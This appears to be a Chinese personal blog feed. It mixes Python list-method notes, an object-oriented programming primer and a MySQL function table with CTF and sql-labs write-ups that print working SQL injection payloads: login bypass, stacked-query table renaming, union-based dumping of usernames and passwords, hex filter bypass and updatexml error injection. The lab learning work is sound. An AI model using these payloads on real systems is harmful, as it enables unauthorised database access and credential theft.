<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = list1.pop()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b462e494f7b31f2c087f2f28cba64051.png"></p>
<h5 id="7、list-remove-obj"><a href="#7、list-remove-obj" class="headerlink" title="7、list.remove(obj)"></a>7、list.remove(obj)</h5><p>移除列表中某个值的<strong>第一个匹配项</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/75a91400ec4d101794495e08b1689516.png"></p>
<h5 id="8、list-reverse"><a href="#8、list-reverse" class="headerlink" title="8、list.reverse()"></a>8、list.reverse()</h5><p>反向列表中的元素，但不会排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.reverse()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201112643577.png"></p>
<h5 id="9、list-sort-key-None-reverse-False"><a href="#9、list-sort-key-None-reverse-False" class="headerlink" title="9、list.sort(key=None, reverse=False)"></a>9、list.sort(key=None, reverse=False)</h5><p>对原列表进行排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.sort()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/202102011129474.png"><br>也可以反向排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.sort(reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113107565.png"></p>
<h5 id="10、list-clear"><a href="#10、list-clear" class="headerlink" title="10、list.clear()"></a>10、list.clear()</h5><p>清空列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.clear()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113429421.png"></p>
<h5 id="11、list-copy"><a href="#11、list-copy" class="headerlink" title="11、list.copy()"></a>11、list.copy()</h5><p>复制列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.copy()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113614734.png"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJ-Web</title>
    <url>/2021/03/11/web/web/</url>
    <content><![CDATA[<p>BUUOJ-Web WriteUp</p>
<a id="more"></a>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p>
<p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
<p>可以登陆进去之后直接看到flag</p>
<p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p>
<blockquote>
<p>flag{2c793226-369d-4941-af62-10463af21b6c}</p>
</blockquote>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p>
<p>爆库名</p>
<blockquote>
<p>1’;show databases;#</p>
</blockquote>
<p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p>
<p>爆表名</p>
<blockquote>
<p>1’;show tables;#</p>
</blockquote>
<p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p>
<p>爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure>
<p>发现id在words表中，那么咱只需要改个表名就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure>
<p>然后只要登入就可以看到flag了</p>
<blockquote>
<p>1’ or 1=1 #</p>
</blockquote>
<p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p>
<p>直接进入ctrl + U看源代码，在下面发现藏东西了</p>
<p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p>
<p>按着GET一个cat变量，出现flag</p>
<p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p>
<blockquote>
<p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p>
</blockquote>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象思想学习</title>
    <url>/2021/01/26/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="面向对象思想学习"><a href="#面向对象思想学习" class="headerlink" title="面向对象思想学习"></a>面向对象思想学习</h1><h2 id="面向对象主要包括七个关键词"><a href="#面向对象主要包括七个关键词" class="headerlink" title="面向对象主要包括七个关键词"></a>面向对象主要包括七个关键词</h2><p>这七个关键词为：数据、方法、对象、类、封装、继承、多态。</p>
<a id="more"></a>
<h3 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h3><p>根据百度百科得知，数据(data)是信息的<strong>表现形式</strong>和<strong>载体</strong>，是事实或观察的结果，是对客观事物的逻辑归纳，是用于表示客观事物的未经加工的原始素材。<br>例如：学生的档案信息，数字：0，1，2，3等，天气预报上的气温温度，诸如此类都可称为数据。<br>而数据进行加工后，就形成了信息。在计算机中，数据是以二进制信息单元0，1进行表示。</p>
<h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><p>方法的基本解析是指为获得某种东西或达到某种目的而采取的<strong>途径</strong>，<strong>步骤</strong>和<strong>手段</strong>，而在软件编程语言中，如果将函数定义为类的一部分或者将函数与某个对象绑定，那么该函数就称之为<strong>方法</strong>。<br>方法简单来说，就是你写ACM题的时候自己写的算法，就像为了减少程序运行时间，为了防止TLE，有时候需要自己写一个快速幂函数，这就可以称作方法，为了达成某种目的而去制作能达成这个目的的方式。d=====(￣▽￣*)b</p>
<h3 id="3、对象"><a href="#3、对象" class="headerlink" title="3、对象"></a>3、对象</h3><p>对象的基本解析是特定人或物，在计算机语言中表现为客观世界中真实存在的人或者物体，在计算机中的逻辑映射。<br>对象可以理解为，在生活中，每个人都是一个对象，每件东西也都是一个对象，可以说<strong>万物皆对象</strong>。在面向对象编程语言中，对象是系统中的基本运行实体，是代码和数据的集合。</p>
<h3 id="4、类"><a href="#4、类" class="headerlink" title="4、类"></a>4、类</h3><p>类简单来说就是分类。在面向对象中，类是实现信息封装的基础，类是一种引用数据类型，也称类类型。每个类包含数据说明和一组操作数据的方法，而上面说的对象则是类的一种实例。<br>举个例子，人类就是一个基本的类类型，而每个人则是这个类类型的实例，也就是对象，人类这个类包含有姓名、性别、年龄等等这些<strong>数据</strong>说明，同时也有走路、吃饭、工作这些传递能量信息的<strong>方法</strong>。</p>
<h3 id="5、封装"><a href="#5、封装" class="headerlink" title="5、封装"></a>5、封装</h3><p>封装是对某一类事物进行抽象描述。封装是个动词，通过将姓名、性别、年龄等这些属性抽象到人类这个类类型的过程就叫封装。当我们一说到人类，就能联想到这个人叫什么名字、是男是女、多大年纪等等。同时封装也能隐藏人身上的一些特殊属性，比如：这个人身上有多少钱，这是我们不可得知的。</p>
<h3 id="6、继承"><a href="#6、继承" class="headerlink" title="6、继承"></a>6、继承</h3><p>继承就是子类继承父类的特征行为，使得子类对象（实例）具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为。同时，子类不仅可以继承父类全部的功能，还可以创建增加新数据、新功能。</p>
<blockquote>
<p>注意：子类继承父类的功能时，不能选择性的继承父类的部分功能，继承是类与类之间的关系，不是对象与对象之间的关系。</p>
</blockquote>
<p>例如：你自己，继承了你父亲的姓名，性别，年龄等这些<strong>属性</strong>，但是你在继承这些属性的同时增加了你会写代码的这么一个方法，而这个写代码的方法是你自己独有的，你的父亲并不具备这个写代码的这个功能。这就是继承。</p>
<h3 id="7、多态"><a href="#7、多态" class="headerlink" title="7、多态"></a>7、多态</h3><p>讲多态前，需要知道接口这一知识点。<br>接口，是一种特殊的类，在这个类中指定必须做什么，但不用规定它如何去做，而多态就是以多种方式告诉这个接口类该如何去做。</p>
<blockquote>
<p>例如：定义一个接口类，这个类中只有一个吃饭的方法，所以我们可以知道这个类中必须要做吃饭这件事，但是吃什么，怎么吃，在哪里吃？这里就可以通过多态来实现了，我们可以再定义两个类去实现这个接口，一个类告诉它我要去中餐厅用筷子吃鱼，另一个类告诉它我要去西餐厅用刀叉吃牛排</p>
</blockquote>
<p>简而言之，多态就是自定义多个方法使接口类实现一件事情的达成。φ(*￣0￣)</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面向对象其实就是环绕类进行拓展，将数据、方法封装进类中，而类又可以创建对象。多态则可以使类增加多种不同的方法，而继承可以使类在原有基础上进行扩展，使类拥有更多的属性、方法。</p>
]]></content>
      <categories>
        <category>编程学习</category>
      </categories>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow web入门 sql</title>
    <url>/2021/02/09/web/sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql/</url>
    <content><![CDATA[<p>CTFshow web入门 sql注入</p>
<a id="more"></a>
<h1 id="sql171"><a href="#sql171" class="headerlink" title="sql171"></a>sql171</h1><p>已给出提示：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>首先判断注入点</p>
</blockquote>
<blockquote>
<p>id=1’ and 1=1</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/14a98fd34b12ede5b79837c8cb71cee6.png" alt="1"></p>
<p>没报错也没有显示任何信息，将1=1改为1=2</p>
<blockquote>
<p>id=1’ and 1=2</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6618d1687fc6391b7fab913fa7304d6f.png" alt="2"></p>
<p>还是没有显示任何信息，说明可以使用 ‘ 字符注入</p>
<p>然后开始判断表有多少列</p>
<blockquote>
<p>id=1’ order by 1,2,3 –+</p>
</blockquote>
<p>没反应</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/baa7fb6b509789bd13a55341b5ed2ead.png" alt="3"></p>
<blockquote>
<p>id=1’ order by 1,2,3,4 –+</p>
</blockquote>
<p>出现异常，说明只有三列</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/395e1e2c8fdbcc279cb5cdd97dc5fff3.png" alt="4"></p>
<p>查询用户，数据库</p>
<blockquote>
<p>id=1’ union select 1,user(),database() –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c082ec58008ebb62f2ad28c500341d79.png" alt="5"></p>
<p>查询该数据库下有哪些表</p>
<blockquote>
<p>id=1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’ctfshow_web’),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/44d780e1a497be20a272bf6ad71e0a67.png" alt="6"></p>
<p>知道表名就可以查询表里的内容了</p>
<blockquote>
<p>id=1’ union select id,username,password from ctfshow_user –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c4aac8c93bb0e44d7dcd3cc474e7da1a.png" alt="7"></p>
<p>w_user –+</p>
<p>[外链图片转存中…(img-4ECGGwnL-1612801653075)]</p>
<p>拿到flag</p>
<h1 id="sql172"><a href="#sql172" class="headerlink" title="sql172"></a>sql172</h1><p>进入题目后已给出查询语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>于是根据查询语句构造payload</p>
<blockquote>
<p>-1” ‘ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210209003048217.png">接着查询表名</p>
<blockquote>
<p>-1” ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021020900314130.png"><br>然后查询表中的数据，先查询ctfshow_user</p>
<blockquote>
<p>-1” ‘ union select id,username,password from ctfshow_user –+</p>
</blockquote>
<p>发现flag不在这里</p>
<p><img src="https://img-blog.csdnimg.cn/20210209003423518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后查询ctfshow_user2</p>
<blockquote>
<p>-1” ‘ union select id,username,password from ctfshow_user2 –+</p>
</blockquote>
<p>发现flag<br><img src="https://img-blog.csdnimg.cn/2021020900351314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="sql173"><a href="#sql173" class="headerlink" title="sql173"></a>sql173</h1><p>根据题目给出的查询语句和返回逻辑发现，题目对id,username,password都进行了正则匹配<br>查询资料发现可以通过hex绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<blockquote>
<p>-1” ‘ union select hex(id),hex(username),hex(password) from ctfshow_user3 where username=’flag’ –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210209005644675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>将获取的结果进行十六进制解码可以得到flag<br><img src="https://img-blog.csdnimg.cn/2021020900572493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql相关函数</title>
    <url>/2021/02/05/web/sql/mysql%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="mysql相关函数"><a href="#mysql相关函数" class="headerlink" title="mysql相关函数"></a>mysql相关函数</h1><a id="more"></a>
<table>
<thead>
<tr>
<th>函数名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>version()</td>
<td>返回数据库版本</td>
</tr>
<tr>
<td>database()</td>
<td>返回数据库名</td>
</tr>
<tr>
<td>user() current_user() system_user()</td>
<td>返回用户名</td>
</tr>
<tr>
<td>@@datadir</td>
<td>返回数据库路径</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>返回操作系统版本</td>
</tr>
<tr>
<td>length()</td>
<td>返回字符串长度</td>
</tr>
<tr>
<td>substring() substr() mid()</td>
<td>截取字符串： 参数1：字符串 参数2：起始位置，索引从1开始 参数3：截取长度</td>
</tr>
<tr>
<td>concat()</td>
<td>不带分隔符链接字符串</td>
</tr>
<tr>
<td>concat_ws()</td>
<td>带分隔符链接字符串： concat_ws(’-’,‘a’,‘b’,‘c’)</td>
</tr>
<tr>
<td>group_concat()</td>
<td>链接一组查询结果字符串</td>
</tr>
<tr>
<td>ord() ascii()</td>
<td>返回字符串的ASCII值</td>
</tr>
<tr>
<td>left()</td>
<td>从左边开始截取字符串： 参数1：字符串 参数2：截取的长度</td>
</tr>
<tr>
<td>rand()</td>
<td>返回0-1之间的浮点数</td>
</tr>
<tr>
<td>round()</td>
<td>四舍五入： round(4.2323151,2)–&gt;4.23</td>
</tr>
<tr>
<td>floor()</td>
<td>向下取整</td>
</tr>
<tr>
<td>load_file()</td>
<td>返回读取文件的内容，返回字符串类型</td>
</tr>
<tr>
<td>if()</td>
<td>判断：if(exp1,exp2,exp3): 如果exp1为真，返回exp2，否则返回exp3</td>
</tr>
<tr>
<td>updatexml()</td>
<td>报错注入可以用到的函数，如果参数2格式不正确，会报错误信息，此时将需要的函数填在这里就会爆出需要的信息 参数1：string格式，为xml文档对象的名称 参数2：xpath格式的字符串 参数3：string格式，替换查找到的符合条件的数据</td>
</tr>
<tr>
<td>addslashes()</td>
<td>转义特殊字符（’ “ \）</td>
</tr>
<tr>
<td>hex()</td>
<td>将字符串转换为16进制</td>
</tr>
<tr>
<td>unhex()</td>
<td></td>
</tr>
<tr>
<td>limit m,n</td>
<td>从m开始 查找n条（索引从0开始）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入基本语句</title>
    <url>/2021/02/05/web/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql-Labs</title>
    <url>/2021/02/07/web/sql/sql-labs/</url>
    <content><![CDATA[<p>sql-labs-less-1-10</p>
<a id="more"></a>

<h1 id="Less-1-基于’-的字符型注入"><a href="#Less-1-基于’-的字符型注入" class="headerlink" title="Less-1-基于’ 的字符型注入"></a>Less-1-基于’ 的字符型注入</h1><p>进去后老套路</p>
<p>先测试一下注入点</p>
<blockquote>
<p>id=1’ and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e974130e6213715867b0a5b332150a8c.png"></p>
<p>把1=1换成1=2</p>
<blockquote>
<p>id=1‘  and 1=2 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8792b518d8154c5ccc0b6e072876661d.png"></p>
<p>发现没有报错，也没有显示错误信息，说明可以使用 ‘ 字符注入</p>
<p>查询有多少列</p>
<blockquote>
<p>id=1’ order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/642125828168fb5342d7dc127e2fccd3.png"></p>
<p>出现错误，证明表中只有三列</p>
<p>判断显示点</p>
<blockquote>
<p>id=-1’ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2f3d76328e8ba05b0004fd749abd53a0.png"></p>
<p>查询用户，数据库</p>
<blockquote>
<p>id=-1’ union select 1,user(),database() –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/846d30e188f1547591acea4bf8b852cf.png"></p>
<p>查询用户名，密码</p>
<blockquote>
<p>id=-1’ union select 1,(select group_concat(concat_ws(‘—‘,username,password)) from users),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c8e1124e5d208d21bf60a1522dc9975b.png"></p>
<h1 id="Less-2-数字型注入"><a href="#Less-2-数字型注入" class="headerlink" title="Less-2-数字型注入"></a>Less-2-数字型注入</h1><p>由提示知道是整数型注入</p>
<p>老套路</p>
<blockquote>
<p>id=1 and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2c1f549f4c118fb6be5f6aeb633b17b3.png"></p>
<p>吧1=1换成1=2</p>
<blockquote>
<p>id=1 and 1=2 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bc45f5df67356a6296e570c0b06e27f2.png"></p>
<p>没有错误，也没有回显，说明为数字型注入</p>
<p>查询有多少列</p>
<blockquote>
<p>id=1 order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7a7b987b06c113264fc76ff59bdab201.png"></p>
<p>查询显示点</p>
<blockquote>
<p>id=-1 union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4ebec5db0104a132a7b042c371f940e2.png"></p>
<p>查询用户名，密码</p>
<blockquote>
<p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/74bfa2cfcb47bb7ad33d3a418d4baee6.png"></p>
<h1 id="Less-3-基于’-的字符注入"><a href="#Less-3-基于’-的字符注入" class="headerlink" title="Less-3-基于’) 的字符注入"></a>Less-3-基于’) 的字符注入</h1><p>提示是弯曲的字符，可以猜测可能是 ) 字符注入</p>
<p>可以直接去看代码验证</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1bb2bca05087136a3b13a39703a6473e.png"></p>
<p>知道了注入点，就开始老套路</p>
<p>查询列数</p>
<blockquote>
<p>id=1’) order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d04a6ee5cdd6fc1d6c785871071abe8b.png"></p>
<p>查询显示点</p>
<blockquote>
<p>id=-1’) union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/468064452acf79cc9c0725801c5ff326.png"></p>
<p>查询用户名，密码</p>
<blockquote>
<p>id=-1’) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e4e3ad10e7ba5a5a956ddc82f8c0c100.png"></p>
<h1 id="Less-4-基于”-的字符型注入"><a href="#Less-4-基于”-的字符型注入" class="headerlink" title="Less-4-基于”) 的字符型注入"></a>Less-4-基于”) 的字符型注入</h1><p>根据提示可以知道，这题是双引号字符注入<br>测试注入点，刚开始还以为是只有双引号的注入点</p>
<blockquote>
<p>id=1” and 1=1 –+</p>
</blockquote>
<p>结果提示错误了<br><img src="https://img-blog.csdnimg.cn/20210206112347169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">于是我就猜测可能是包括了上一题的 ) 字符注入点，在后面加个 )</p>
<blockquote>
<p>id=1”) and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206112458418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">有反应了，继续测试</p>
<blockquote>
<p>id=1”) and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206112557663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">没有提示错误也没有回显，说明注入点正确，接下来就是老套路了</p>
<blockquote>
<p>id=1”) order by 4 –+ //查询列<br>id=-1”) union select 1,2,3 –+ //查询显示点<br>id=-1”) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+ //查询用户名，密码</p>
</blockquote>
<p>最终结果<br><img src="https://img-blog.csdnimg.cn/20210206112921881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-5-基于’-的报错注入"><a href="#Less-5-基于’-的报错注入" class="headerlink" title="Less-5-基于’ 的报错注入"></a>Less-5-基于’ 的报错注入</h1><p>题目刚开始给了个double query的提示，由于是第一次见，没明白是啥意思。<br>就开始常规的测试一下注入点</p>
<blockquote>
<p>id=1’ and 1=1 –+<br>id=1’ and 1=2 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206120620545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210206120634918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现字符注入可行，查询一下列数</p>
<blockquote>
<p>id=1’ order by 4 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206120737992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后查显示点的时候，发现一个很严重的问题，题目没有给出显示点</p>
<blockquote>
<p>id=-1’ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206120858544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">还没见过这种类型题，于是去看了眼源码<br><img src="https://img-blog.csdnimg.cn/20210206184538545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>在这看到会输出mysql_error()<br>所以想到了报错注入，因为第一次遇到，所以去找了找报错注入咋搞<br>发现可以updatexml()注入</p>
<blockquote>
<p>id=-1’ union select updatexml(1,concat(0x7e,user(),0x7e),1) –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210206185449491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h2 id="updatexml-语法"><a href="#updatexml-语法" class="headerlink" title="updatexml()语法"></a>updatexml()语法</h2><p>updatexml()：(XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>其实，第一个和第三个参数可以随意填写</p>
<h1 id="Less-6-基于”-的报错注入"><a href="#Less-6-基于”-的报错注入" class="headerlink" title="Less-6-基于” 的报错注入"></a>Less-6-基于” 的报错注入</h1><p>与上一题同样是报错注入，但是注入点变为了 “ </p>
<blockquote>
<p>id=-1” union select updatexml(1,concat(user()),1) –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207103757424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
